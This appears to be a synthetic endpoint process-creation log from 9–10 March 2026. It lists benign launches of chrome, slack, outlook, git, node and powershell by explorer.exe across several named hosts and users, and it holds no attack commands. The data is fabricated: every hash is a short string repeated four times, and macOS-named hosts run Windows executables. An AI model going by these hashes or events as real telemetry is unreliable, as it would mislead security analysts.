2026-03-09 23:59:08.713,FIN-WS22,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00073c1eaf6f493d00073c1eaf6f493d00073c1eaf6f493d00073c1eaf6f493d
2026-03-10 00:10:00.824,MAC-DEV-17,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00169c896699f78100169c896699f78100169c896699f78100169c896699f781
2026-03-10 00:21:47.125,FIN-WS31,r.kapoor,1,git,"git",explorer.exe,,,SHA256=0010887084a8f4d50010887084a8f4d50010887084a8f4d50010887084a8f4d5
2026-03-10 00:28:45.924,BLD-RUN-02,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0011d0eaa2a5cef80011d0eaa2a5cef80011d0eaa2a5cef80011d0eaa2a5cef8
2026-03-10 00:32:09.551,BLD-RUN-02,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00165cf7b3cde90d00165cf7b3cde90d00165cf7b3cde90d00165cf7b3cde90d
2026-03-10 00:41:33.359,MAC-DEV-04,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00004f31c1b29f9b00004f31c1b29f9b00004f31c1b29f9b00004f31c1b29f9b
2026-03-10 00:45:50.948,FIN-WS31,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000e1080becc3a48000e1080becc3a48000e1080becc3a48000e1080becc3a48
2026-03-10 00:55:12.779,FIN-WS22,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0020a4d2ac8a7bbc0020a4d2ac8a7bbc0020a4d2ac8a7bbc0020a4d2ac8a7bbc
2026-03-10 01:02:47.717,BLD-RUN-02,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001b0b9fd0f472d8001b0b9fd0f472d8001b0b9fd0f472d8001b0b9fd0f472d8
2026-03-10 01:11:02.481,MAC-DEV-17,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=002223ee1945e44a002223ee1945e44a002223ee1945e44a002223ee1945e44a
2026-03-10 01:17:32.652,MAC-DEV-17,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000c0d08e10c34ee000c0d08e10c34ee000c0d08e10c34ee000c0d08e10c34ee
2026-03-10 01:24:52.214,MAC-DEV-04,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0001d776d9c0ce160001d776d9c0ce160001d776d9c0ce160001d776d9c0ce16
2026-03-10 01:39:20.253,MAC-DEV-04,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001c9c535e80ee41001c9c535e80ee41001c9c535e80ee41001c9c535e80ee41
2026-03-10 01:46:57.231,BLD-RUN-02,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000e9ea9a68d5f44000e9ea9a68d5f44000e9ea9a68d5f44000e9ea9a68d5f44
2026-03-10 01:51:17.189,MAC-DEV-17,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001e6955b0e89efb001e6955b0e89efb001e6955b0e89efb001e6955b0e89efb
2026-03-10 02:01:52.470,FIN-WS31,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0022ed18b64833500022ed18b64833500022ed18b64833500022ed18b6483350
2026-03-10 02:05:39.133,MAC-DEV-04,n.byrd,1,git,"git",explorer.exe,,,SHA256=001e8b682f72efa9001e8b682f72efa9001e8b682f72efa9001e8b682f72efa9
2026-03-10 02:13:36.975,MAC-DEV-04,l.chen,1,git,"git",explorer.exe,,,SHA256=00015a86716d1d6600015a86716d1d6600015a86716d1d6600015a86716d1d66
2026-03-10 02:17:09.657,FIN-WS31,t.owens,1,git,"git",explorer.exe,,,SHA256=000f3132d99dce43000f3132d99dce43000f3132d99dce43000f3132d99dce43
2026-03-10 02:27:21.011,FIN-WS31,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000aa15a7c8703e4000aa15a7c8703e4000aa15a7c8703e4000aa15a7c8703e4
2026-03-10 02:38:52.997,FIN-WS31,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00237307bce3188400237307bce3188400237307bce3188400237307bce31884
2026-03-10 02:43:30.452,MAC-DEV-17,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001721943e67dd29001721943e67dd29001721943e67dd29001721943e67dd29
2026-03-10 02:54:34.140,BLD-RUN-02,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0009f34429e78a2d0009f34429e78a2d0009f34429e78a2d0009f34429e78a2d
2026-03-10 03:08:13.843,MAC-DEV-04,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000c7a294675dd2b000c7a294675dd2b000c7a294675dd2b000c7a294675dd2b
2026-03-10 03:15:00.515,FIN-WS22,m.sato,1,node,"node",explorer.exe,,,SHA256=001564953985c7ea001564953985c7ea001564953985c7ea001564953985c7ea
2026-03-10 03:18:35.583,FIN-WS31,m.sato,1,node,"node",explorer.exe,,,SHA256=00203c0f5c2dd46c00203c0f5c2dd46c00203c0f5c2dd46c00203c0f5c2dd46c
2026-03-10 03:22:03.383,MAC-DEV-17,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0020218f324b03ea0020218f324b03ea0020218f324b03ea0020218f324b03ea
2026-03-10 03:36:52.922,MAC-DEV-17,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0009937027116c3b0009937027116c3b0009937027116c3b0009937027116c3b
2026-03-10 03:48:57.547,FIN-WS22,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00201735efbfef7000201735efbfef7000201735efbfef7000201735efbfef70
2026-03-10 03:52:03.475,FIN-WS31,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000032a8309ca175000032a8309ca175000032a8309ca175000032a8309ca175
2026-03-10 03:58:38.995,MAC-DEV-04,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001e3fb1ca0d84e5001e3fb1ca0d84e5001e3fb1ca0d84e5001e3fb1ca0d84e5
2026-03-10 04:11:02.614,FIN-WS22,r.kapoor,1,node,"node",explorer.exe,,,SHA256=0011c318a1446e100011c318a1446e100011c318a1446e100011c318a1446e10
2026-03-10 04:22:15.311,MAC-DEV-04,e.park,1,node,"node",explorer.exe,,,SHA256=0020dd6ccb7740360020dd6ccb7740360020dd6ccb7740360020dd6ccb774036
2026-03-10 04:31:05.069,FIN-WS31,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0009054741f34b3c0009054741f34b3c0009054741f34b3c0009054741f34b3c
2026-03-10 04:36:16.870,MAC-DEV-17,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0016586b1ee5a77c0016586b1ee5a77c0016586b1ee5a77c0016586b1ee5a77c
2026-03-10 04:50:51.140,FIN-WS22,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001f18838af4e8eb001f18838af4e8eb001f18838af4e8eb001f18838af4e8eb
2026-03-10 04:57:21.728,MAC-DEV-17,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000a553e970e2442000a553e970e2442000a553e970e2442000a553e970e2442
2026-03-10 05:06:33.858,BLD-RUN-02,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001716c1e62874e9001716c1e62874e9001716c1e62874e9001716c1e62874e9
2026-03-10 05:11:07.505,MAC-DEV-04,m.sato,1,git,"git",explorer.exe,,,SHA256=001bb49772d72def001bb49772d72def001bb49772d72def001bb49772d72def
2026-03-10 05:16:57.923,BLD-RUN-02,r.kapoor,1,git,"git",explorer.exe,,,SHA256=00115ee63febe2f900115ee63febe2f900115ee63febe2f900115ee63febe2f9
2026-03-10 05:20:13.135,BLD-RUN-02,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00150f3b7456380f00150f3b7456380f00150f3b7456380f00150f3b7456380f
2026-03-10 05:28:53.114,MAC-DEV-17,a.velasquez,1,node,"node",explorer.exe,,,SHA256=001eb234975d2895001eb234975d2895001eb234975d2895001eb234975d2895
2026-03-10 05:33:55.914,FIN-WS22,r.kapoor,1,git,"git",explorer.exe,,,SHA256=0010a594b36acb980010a594b36acb980010a594b36acb980010a594b36acb98
2026-03-10 05:45:02.811,MAC-DEV-17,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001f7b1395f81a37001f7b1395f81a37001f7b1395f81a37001f7b1395f81a37
2026-03-10 05:58:38.570,MAC-DEV-04,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0009df5e057738600009df5e057738600009df5e057738600009df5e05773860
2026-03-10 06:02:11.072,FIN-WS31,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00097d4f40f3dd5800097d4f40f3dd5800097d4f40f3dd5800097d4f40f3dd58
2026-03-10 06:15:40.814,MAC-DEV-17,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000581eb6220745a000581eb6220745a000581eb6220745a000581eb6220745a
2026-03-10 06:27:08.077,FIN-WS22,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000bfdb2830e8193000bfdb2830e8193000bfdb2830e8193000bfdb2830e8193
2026-03-10 06:34:33.788,FIN-WS22,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00090542f04e985900090542f04e985900090542f04e985900090542f04e9859
2026-03-10 06:38:42.495,BLD-RUN-02,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001fb356eedb9c84001fb356eedb9c84001fb356eedb9c84001fb356eedb9c84
2026-03-10 06:53:07.781,FIN-WS22,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00068176a4df065e00068176a4df065e00068176a4df065e00068176a4df065e
2026-03-10 07:01:39.156,MAC-DEV-04,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000789e169fc8755000789e169fc8755000789e169fc8755000789e169fc8755
2026-03-10 07:06:17.217,BLD-RUN-02,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0017b9eddbd733ce0017b9eddbd733ce0017b9eddbd733ce0017b9eddbd733ce
2026-03-10 07:12:10.060,MAC-DEV-04,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0010c694da386a2c0010c694da386a2c0010c694da386a2c0010c694da386a2c
2026-03-10 07:19:06.049,FIN-WS22,e.park,1,git,"git",explorer.exe,,,SHA256=000ce2529de161fb000ce2529de161fb000ce2529de161fb000ce2529de161fb
2026-03-10 07:29:05.046,FIN-WS22,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00196056690468c000196056690468c000196056690468c000196056690468c0
2026-03-10 07:43:15.035,FIN-WS22,r.kapoor,1,node,"node",explorer.exe,,,SHA256=0013ea692b77d1dc0013ea692b77d1dc0013ea692b77d1dc0013ea692b77d1dc
2026-03-10 07:50:14.015,FIN-WS31,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0021769670e954ea0021769670e954ea0021769670e954ea0021769670e954ea
2026-03-10 08:02:33.664,MAC-DEV-04,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001efed897cc43f5001efed897cc43f5001efed897cc43f5001efed897cc43f5
2026-03-10 08:13:34.327,FIN-WS31,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0011c1d3c89116f20011c1d3c89116f20011c1d3c89116f20011c1d3c89116f2
2026-03-10 08:21:57.560,MAC-DEV-04,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000c74ed1afb6bb8000c74ed1afb6bb8000c74ed1afb6bb8000c74ed1afb6bb8
2026-03-10 08:27:33.530,FIN-WS31,m.sato,1,node,"node",explorer.exe,,,SHA256=0001b8713fa2d0df0001b8713fa2d0df0001b8713fa2d0df0001b8713fa2d0df
2026-03-10 08:35:50.650,MAC-DEV-17,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00023bf0ffc375e800023bf0ffc375e800023bf0ffc375e800023bf0ffc375e8
2026-03-10 08:49:57.702,MAC-DEV-17,n.byrd,1,git,"git",explorer.exe,,,SHA256=00215c422791711200215c422791711200215c422791711200215c4227917112
2026-03-10 08:54:04.126,FIN-WS31,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000c6f566b9f6bc5000c6f566b9f6bc5000c6f566b9f6bc5000c6f566b9f6bc5
2026-03-10 09:01:58.183,MAC-DEV-04,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0022016d81c741fc0022016d81c741fc0022016d81c741fc0022016d81c741fc
2026-03-10 09:14:34.900,BLD-RUN-02,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=002307e6bf552906002307e6bf552906002307e6bf552906002307e6bf552906
2026-03-10 09:27:03.039,BLD-RUN-02,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00016857a2ead7ac00016857a2ead7ac00016857a2ead7ac00016857a2ead7ac
2026-03-10 09:39:48.652,MAC-DEV-04,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001b32ceaba058ec001b32ceaba058ec001b32ceaba058ec001b32ceaba058ec
2026-03-10 09:49:43.023,FIN-WS22,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00236422684dd98200236422684dd98200236422684dd98200236422684dd982
2026-03-10 10:04:10.462,FIN-WS31,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0019fba78d5c8efe0019fba78d5c8efe0019fba78d5c8efe0019fba78d5c8efe
2026-03-10 10:13:03.814,FIN-WS22,t.owens,1,git,"git",explorer.exe,,,SHA256=000a8e5ed7ca5d56000a8e5ed7ca5d56000a8e5ed7ca5d56000a8e5ed7ca5d56
2026-03-10 10:22:13.074,FIN-WS22,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001f92b13f95a226001f92b13f95a226001f92b13f95a226001f92b13f95a226
2026-03-10 10:36:55.645,FIN-WS31,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0020fd8eb1482ac80020fd8eb1482ac80020fd8eb1482ac80020fd8eb1482ac8
2026-03-10 10:42:52.925,MAC-DEV-17,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001fceb5592d053e001fceb5592d053e001fceb5592d053e001fceb5592d053e
2026-03-10 10:56:36.926,BLD-RUN-02,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00231349a9d6189800231349a9d6189800231349a9d6189800231349a9d61898
2026-03-10 11:07:50.845,MAC-DEV-17,t.owens,1,git,"git",explorer.exe,,,SHA256=000f29311fa27e5c000f29311fa27e5c000f29311fa27e5c000f29311fa27e5c
2026-03-10 11:13:38.711,FIN-WS31,n.byrd,1,git,"git",explorer.exe,,,SHA256=000e017b983b1b3a000e017b983b1b3a000e017b983b1b3a000e017b983b1b3a
2026-03-10 11:23:51.568,MAC-DEV-04,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001b18ddf23a665c001b18ddf23a665c001b18ddf23a665c001b18ddf23a665c
2026-03-10 11:27:40.787,FIN-WS31,r.kapoor,1,node,"node",explorer.exe,,,SHA256=0017af0e54a75b080017af0e54a75b080017af0e54a75b080017af0e54a75b08
2026-03-10 11:33:57.671,BLD-RUN-02,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00065c5137ec147200065c5137ec147200065c5137ec147200065c5137ec1472
2026-03-10 11:38:06.360,BLD-RUN-02,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000e954ac5e711a8000e954ac5e711a8000e954ac5e711a8000e954ac5e711a8
2026-03-10 11:42:42.987,BLD-RUN-02,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000102190a6455cf000102190a6455cf000102190a6455cf000102190a6455cf
2026-03-10 11:50:19.660,MAC-DEV-04,r.kapoor,1,git,"git",explorer.exe,,,SHA256=001fdbe4a483d1b9001fdbe4a483d1b9001fdbe4a483d1b9001fdbe4a483d1b9
2026-03-10 12:04:21.690,MAC-DEV-17,r.kapoor,1,node,"node",explorer.exe,,,SHA256=0012267067765fa00012267067765fa00012267067765fa00012267067765fa0
2026-03-10 12:08:07.947,MAC-DEV-17,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00029dd9aa6988be00029dd9aa6988be00029dd9aa6988be00029dd9aa6988be
2026-03-10 12:21:25.871,FIN-WS31,m.sato,1,node,"node",explorer.exe,,,SHA256=0004daacb65499e50004daacb65499e50004daacb65499e50004daacb65499e5
2026-03-10 12:26:15.155,MAC-DEV-04,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001041d0eeb9d2d7001041d0eeb9d2d7001041d0eeb9d2d7001041d0eeb9d2d7
2026-03-10 12:30:20.267,FIN-WS31,n.byrd,1,git,"git",explorer.exe,,,SHA256=000bab30737d8402000bab30737d8402000bab30737d8402000bab30737d8402
2026-03-10 12:33:47.533,BLD-RUN-02,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001e3b80a22c68d1001e3b80a22c68d1001e3b80a22c68d1001e3b80a22c68d1
2026-03-10 12:43:41.609,BLD-RUN-02,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001428163997d7f0001428163997d7f0001428163997d7f0001428163997d7f0
2026-03-10 12:47:20.825,BLD-RUN-02,m.sato,1,git,"git",explorer.exe,,,SHA256=00141b0286535c8e00141b0286535c8e00141b0286535c8e00141b0286535c8e
2026-03-10 12:59:25.591,FIN-WS31,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00120a2e5112877100120a2e5112877100120a2e5112877100120a2e51128771
2026-03-10 13:06:42.580,BLD-RUN-02,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0003b2a2e9e7ccdb0003b2a2e9e7ccdb0003b2a2e9e7ccdb0003b2a2e9e7ccdb
2026-03-10 13:13:00.437,FIN-WS22,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0016f633a49646c20016f633a49646c20016f633a49646c20016f633a49646c2
2026-03-10 13:26:50.823,FIN-WS22,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001eb2741fda892b001eb2741fda892b001eb2741fda892b001eb2741fda892b
2026-03-10 13:36:56.289,FIN-WS31,l.chen,1,node,"node",explorer.exe,,,SHA256=0022da8a3663a2940022da8a3663a2940022da8a3663a2940022da8a3663a294
2026-03-10 13:50:40.291,FIN-WS22,l.chen,1,git,"git",explorer.exe,,,SHA256=001a199ea6d816c8001a199ea6d816c8001a199ea6d816c8001a199ea6d816c8
2026-03-10 14:01:07.795,FIN-WS31,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001927cdfab12b5a001927cdfab12b5a001927cdfab12b5a001927cdfab12b5a
2026-03-10 14:09:48.524,MAC-DEV-04,r.kapoor,1,node,"node",explorer.exe,,,SHA256=0006ec2c0a7c7c840006ec2c0a7c7c840006ec2c0a7c7c840006ec2c0a7c7c84
2026-03-10 14:23:27.198,BLD-RUN-02,e.park,1,git,"git",explorer.exe,,,SHA256=002126eb3c1c9e30002126eb3c1c9e30002126eb3c1c9e30002126eb3c1c9e30
2026-03-10 14:27:25.005,BLD-RUN-02,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00034a0cf3fa76f100034a0cf3fa76f100034a0cf3fa76f100034a0cf3fa76f1
2026-03-10 14:34:40.580,FIN-WS22,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00187f29f1be33dd00187f29f1be33dd00187f29f1be33dd00187f29f1be33dd
2026-03-10 14:42:56.066,MAC-DEV-04,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000f390fc4b80e9b000f390fc4b80e9b000f390fc4b80e9b000f390fc4b80e9b
2026-03-10 14:53:44.525,MAC-DEV-04,l.chen,1,node,"node",explorer.exe,,,SHA256=001cd6fc25f0f0c5001cd6fc25f0f0c5001cd6fc25f0f0c5001cd6fc25f0f0c5
2026-03-10 14:56:45.122,FIN-WS22,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001319cefda14ae7001319cefda14ae7001319cefda14ae7001319cefda14ae7
2026-03-10 15:07:58.000,MAC-DEV-04,t.owens,1,node,"node",explorer.exe,,,SHA256=001122b0969004c9001122b0969004c9001122b0969004c9001122b0969004c9
2026-03-10 15:19:00.756,BLD-RUN-02,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001e6d90416ab780001e6d90416ab780001e6d90416ab780001e6d90416ab780
2026-03-10 15:28:48.559,BLD-RUN-02,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0003b25f568c905d0003b25f568c905d0003b25f568c905d0003b25f568c905d
2026-03-10 15:43:22.966,MAC-DEV-17,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000a7a95254df773000a7a95254df773000a7a95254df773000a7a95254df773
2026-03-10 15:46:26.694,FIN-WS22,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001619cf1fa58c67001619cf1fa58c67001619cf1fa58c67001619cf1fa58c67
2026-03-10 15:54:29.260,FIN-WS22,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0020a499e69c80760020a499e69c80760020a499e69c80760020a499e69c8076
2026-03-10 16:07:01.133,MAC-DEV-04,n.byrd,1,git,"git",explorer.exe,,,SHA256=0002f3091b67ac9d0002f3091b67ac9d0002f3091b67ac9d0002f3091b67ac9d
2026-03-10 16:12:06.041,BLD-RUN-02,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0011973560bb21dd0011973560bb21dd0011973560bb21dd0011973560bb21dd
2026-03-10 16:21:14.828,MAC-DEV-17,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00051204f387f08000051204f387f08000051204f387f08000051204f387f080
2026-03-10 16:25:55.525,FIN-WS22,r.kapoor,1,node,"node",explorer.exe,,,SHA256=0009f079427efe570009f079427efe570009f079427efe570009f079427efe57
2026-03-10 16:38:30.013,MAC-DEV-04,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0022b3bb5dd5c5200022b3bb5dd5c5200022b3bb5dd5c5200022b3bb5dd5c520
2026-03-10 16:46:13.109,MAC-DEV-17,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00132b46b2b26c6b00132b46b2b26c6b00132b46b2b26c6b00132b46b2b26c6b
2026-03-10 16:55:44.836,BLD-RUN-02,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0017f130c15b2a530017f130c15b2a530017f130c15b2a530017f130c15b2a53
2026-03-10 17:10:23.377,FIN-WS22,a.velasquez,1,node,"node",explorer.exe,,,SHA256=001265569b52993b001265569b52993b001265569b52993b001265569b52993b
2026-03-10 17:21:17.420,MAC-DEV-04,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00095f33ce69d00400095f33ce69d00400095f33ce69d00400095f33ce69d004
2026-03-10 17:33:23.528,MAC-DEV-04,a.velasquez,1,git,"git",explorer.exe,,,SHA256=000672c44ce71a2b000672c44ce71a2b000672c44ce71a2b000672c44ce71a2b
2026-03-10 17:45:09.503,MAC-DEV-17,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0003e74acc7ba4c40003e74acc7ba4c40003e74acc7ba4c40003e74acc7ba4c4
2026-03-10 17:49:59.711,BLD-RUN-02,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00219749ddc9a55600219749ddc9a55600219749ddc9a55600219749ddc9a556
2026-03-10 17:59:54.844,MAC-DEV-17,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0001ad4cab7a64c30001ad4cab7a64c30001ad4cab7a64c30001ad4cab7a64c3
2026-03-10 18:04:13.293,FIN-WS22,r.kapoor,1,node,"node",explorer.exe,,,SHA256=00223c982c653df400223c982c653df400223c982c653df400223c982c653df4
2026-03-10 18:10:31.073,MAC-DEV-04,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000f304b0ddc70d8000f304b0ddc70d8000f304b0ddc70d8000f304b0ddc70d8
2026-03-10 18:24:09.235,MAC-DEV-17,r.kapoor,1,git,"git",explorer.exe,,,SHA256=000b8bc354c41120000b8bc354c41120000b8bc354c41120000b8bc354c41120
2026-03-10 18:33:21.371,FIN-WS22,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001945b157221f47001945b157221f47001945b157221f47001945b157221f47
2026-03-10 18:42:16.209,FIN-WS22,l.chen,1,node,"node",explorer.exe,,,SHA256=0020139c0dd658a80020139c0dd658a80020139c0dd658a80020139c0dd658a8
2026-03-10 18:56:38.077,BLD-RUN-02,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00112192d713e46000112192d713e46000112192d713e46000112192d713e460
2026-03-10 19:04:16.688,MAC-DEV-04,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0011909b351eacba0011909b351eacba0011909b351eacba0011909b351eacba
2026-03-10 19:09:37.679,FIN-WS22,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000b254ae2b2af36000b254ae2b2af36000b254ae2b2af36000b254ae2b2af36
2026-03-10 19:21:23.641,BLD-RUN-02,n.byrd,1,git,"git",explorer.exe,,,SHA256=0013fa16ace48abd0013fa16ace48abd0013fa16ace48abd0013fa16ace48abd
2026-03-10 19:31:49.558,MAC-DEV-04,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001e84f6b12cb6f3001e84f6b12cb6f3001e84f6b12cb6f3001e84f6b12cb6f3
2026-03-10 19:36:57.481,FIN-WS31,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0006154326394e8f0006154326394e8f0006154326394e8f0006154326394e8f
2026-03-10 19:50:22.916,FIN-WS31,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000ec147062e4794000ec147062e4794000ec147062e4794000ec147062e4794
2026-03-10 19:55:31.279,BLD-RUN-02,t.owens,1,git,"git",explorer.exe,,,SHA256=00200d7b474fbcfe00200d7b474fbcfe00200d7b474fbcfe00200d7b474fbcfe
2026-03-10 20:03:31.390,FIN-WS22,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0003d7ccd911f1200003d7ccd911f1200003d7ccd911f1200003d7ccd911f120
2026-03-10 20:16:52.689,FIN-WS31,m.sato,1,git,"git",explorer.exe,,,SHA256=000fe991f3a85938000fe991f3a85938000fe991f3a85938000fe991f3a85938
2026-03-10 20:27:16.632,BLD-RUN-02,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000ac05a4af8628b000ac05a4af8628b000ac05a4af8628b000ac05a4af8628b
2026-03-10 20:31:16.344,BLD-RUN-02,n.byrd,1,node,"node",explorer.exe,,,SHA256=0013857fc193648c0013857fc193648c0013857fc193648c0013857fc193648c
2026-03-10 20:44:04.371,MAC-DEV-04,n.byrd,1,git,"git",explorer.exe,,,SHA256=002175105dc341e4002175105dc341e4002175105dc341e4002175105dc341e4
2026-03-10 20:57:59.339,BLD-RUN-02,n.byrd,1,git,"git",explorer.exe,,,SHA256=001a7ca56b0b66a4001a7ca56b0b66a4001a7ca56b0b66a4001a7ca56b0b66a4
2026-03-10 21:02:02.955,BLD-RUN-02,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001c9389d3460d83001c9389d3460d83001c9389d3460d83001c9389d3460d83
2026-03-10 21:07:03.689,MAC-DEV-04,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000d635a66ebc629000d635a66ebc629000d635a66ebc629000d635a66ebc629
2026-03-10 21:13:18.783,MAC-DEV-17,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0007dac7db828e560007dac7db828e560007dac7db828e560007dac7db828e56
2026-03-10 21:18:41.927,MAC-DEV-04,e.park,1,git,"git",explorer.exe,,,SHA256=0008922abc171c770008922abc171c770008922abc171c770008922abc171c77
2026-03-10 21:32:29.208,FIN-WS31,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00058a96bd5f317700058a96bd5f317700058a96bd5f317700058a96bd5f3177
2026-03-10 21:39:34.219,FIN-WS31,a.velasquez,1,node,"node",explorer.exe,,,SHA256=0012e7ecd022dcb80012e7ecd022dcb80012e7ecd022dcb80012e7ecd022dcb8
2026-03-10 21:44:45.105,MAC-DEV-17,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001cd9375b5bcfac001cd9375b5bcfac001cd9375b5bcfac001cd9375b5bcfac
2026-03-10 21:52:06.102,FIN-WS22,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00013b2991bc6db100013b2991bc6db100013b2991bc6db100013b2991bc6db1
2026-03-10 21:56:46.136,BLD-RUN-02,t.owens,1,node,"node",explorer.exe,,,SHA256=0015dbf974d68b8b0015dbf974d68b8b0015dbf974d68b8b0015dbf974d68b8b
2026-03-10 22:07:44.074,FIN-WS31,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000af70b025646fe000af70b025646fe000af70b025646fe000af70b025646fe
2026-03-10 22:14:25.560,MAC-DEV-17,a.velasquez,1,git,"git",explorer.exe,,,SHA256=00169b873ec5935900169b873ec5935900169b873ec5935900169b873ec59359
